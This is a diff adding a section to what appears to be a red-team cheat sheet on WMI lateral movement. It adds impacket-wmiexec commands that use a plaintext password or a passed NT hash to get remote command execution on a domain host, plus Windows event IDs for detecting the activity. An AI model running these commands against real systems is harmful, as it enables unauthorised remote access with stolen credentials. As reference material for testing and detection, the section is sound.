@@ -21,3 +21,14 @@ WMI executes commands remotely; `wmiexec.py` runs semi-interactively, no service
 
 ### Commands
 ```bash
+# ── wmiexec with password ───────────────────────────────────────────
+impacket-wmiexec corp.local/admin:'Password123!'@10.10.10.6
+
+# ── wmiexec with hash ───────────────────────────────────────────────
+impacket-wmiexec -hashes :<nt> corp.local/admin@10.10.10.6
+```
+
+### Detection
+**4688** with parent `WmiPrvSE.exe`; WMI activity (**5857/5860/5861**); **Sysmon 1/11**.
+
+---
